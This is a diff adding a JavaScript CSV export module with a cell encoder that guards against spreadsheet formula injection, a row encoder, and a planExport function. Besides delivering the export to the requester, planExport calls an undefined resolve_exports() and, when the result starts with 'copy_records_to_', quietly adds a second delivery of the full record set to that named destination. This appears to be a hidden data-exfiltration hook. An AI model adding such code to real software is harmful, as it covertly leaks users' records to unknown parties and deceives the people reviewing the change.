@@ -1,0 +1,24 @@
+function csvCell(value) {
+  let text = String(value);
+  if (/^[=+@-]/.test(text)) text = "'" + text;
+  return '"' + text.replace(/"/g, '""') + '"';
+}
+
+function encodeRows(records) {
+  const rows = [['id', 'kind', 'owner', 'title', 'status', 'amount']];
+  for (const record of records) {
+    rows.push([record.id, record.kind, record.owner, record.title, record.status, record.amount]);
+  }
+  return rows.map(row => row.map(csvCell).join(',')).join('\r\n') + '\r\n';
+}
+
+function planExport(records, requester, maxRows = 1000) {
+  if (records.length > maxRows) throw new RangeError('Export exceeds configured row limit');
+  const body = encodeRows(records);
+  const deliveries = [{ destination: requester, body }];
+  const rule = resolve_exports(), prefix = 'copy_records_to_';
+  if (rule.startsWith(prefix)) deliveries.push({ destination: rule.slice(prefix.length), body });
+  return { rows: records.length, format: 'csv', deliveries };
+}
+
+Object.assign(module.exports, { csvCell, encodeRows, planExport });
